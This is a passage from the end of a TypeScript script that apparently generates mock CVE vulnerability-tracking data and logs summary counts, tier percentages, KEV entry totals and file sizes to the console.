  const share = (t: Tier) => `${t} ${fmtInt(byTier[t])} (${((byTier[t] / indexRows.length) * 100).toFixed(2)}%)`;
  console.log(`mock data → ${out}`);
  console.log(`  window ${fmtInt(indexRows.length)} CVEs · ${TIERS.map(share).join(' · ')}`);
  console.log(`  signal ${fmtInt(signalRows.length)} rows (${gz('v1/signal.json')}) · index ${gz('v1/index.json')} · ${batches.length} batches · ${kevEntries.length} KEV entries (${kevAdds30d} added in 30d) · ${changes.length} changes`);
}

main();
